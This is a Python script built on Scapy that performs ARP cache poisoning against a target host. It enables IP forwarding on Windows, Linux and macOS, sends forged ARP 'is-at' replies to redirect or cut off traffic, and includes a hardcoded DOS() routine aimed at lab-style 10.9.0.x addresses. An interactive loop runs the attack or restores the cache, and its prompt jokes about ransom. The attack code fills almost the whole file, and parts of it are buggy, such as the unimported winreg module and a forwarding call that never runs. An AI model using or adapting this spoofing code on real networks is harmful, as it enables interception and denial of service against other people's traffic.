# Required Libraries:
from scapy.all import Ether, ARP, srp, send
from scapy.all import *
import time
import os

# It may be necessary to configure Linux IP forwarding on a Linux system in certain scenarios. If the Linux server is acting as a firewall, router, or NAT device, it will need to be capable of forwarding packets that are meant for other destinations (other than itself).


def _enable_linux_ipforwarding():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)

# When using Windows operating systems, you may need to enable IP routing in order to set up static routing tables using ROUTE.EXE. IP Routing is the process that allows data to cross over a network of computers rather than just one. Routing is often disabled by default in Windows. 


def _enable_windows_ipforwarding():
    name = "IPEnableRouter"
    value = 1
    REG_PATH = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_DWORD, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False
#You may enable packet forwarding by entering sudo sysctl -w net. inet. ip. forwarding=1 into the Terminal.

def _enable_macosx_ipforwarding():
    os.system('sudo sysctl -w net.inet.ip.forwarding=1')

# function to detect the operating system and enable IP forwarding in any system, to make the program global and dynamic
def enable_ip_route():
    print("IP FORWARDING...")
    _enable_windows_ipforwarding() if "nt" in os.name else (_enable_macosx_ipforwarding if "posix" in os.name else _enable_linux_ipforwarding())

# fetch the MAC adress of the system we are attacking 
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) 
    if ans:
        return ans[0][1].src
#To fetch the adress of victim and attacker and send an arp response to restore packet 

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=5)
    print("(UN) Faking MAC " + target_ip + ": " + host_ip + " is-at " + host_mac)

# To fetch the address of victim and spoof it with our address meanwhile recording everything
def poison(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response)
    self_mac = ARP().hwsrc
    print("Faking MAC " + target_ip + ": " + host_ip + " is-at " + self_mac)


def DOS():
    E = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:09')
    A = ARP(hwsrc='02:42:0a:09:00:09',psrc='10.9.0.6', 
        hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
    pkt = E/A
    pkt.show()
    sendp(pkt)
    print('starting ping service')
    enable_ip_route()
    os.system('sysctl -w net.ipv4.icmp_echo_ignore_all=1')

def restore1():
    E = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:06')
    A = ARP(hwsrc='02:42:0a:09:00:06',psrc='10.9.0.6', 
	hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
    pkt = E/A
    pkt.show()
    print('starting ping service')
    sendp(pkt)

    os.system('sysctl -w net.ipv4.icmp_echo_ignore_all=0')


# running all the functions through main in an interactive manner.
if __name__ == "__main__":
    target = input("Enter IP address of the target: ")
    host = input("Enter IP address of the host: ")
    enable_ip_route()
    try:
        while True:
            oppt = input("Enter 1 to attack the system and send money to release the system (J.K.) just 2 to release :P ")
            if oppt=='1':
                DOS()
            else:
                restore1()
            time.sleep(1)
    except KeyboardInterrupt:
        print("KEYBOARD INTERRUPT, UNSPOOFING...")
        restore(target, host)
        restore(host, target)



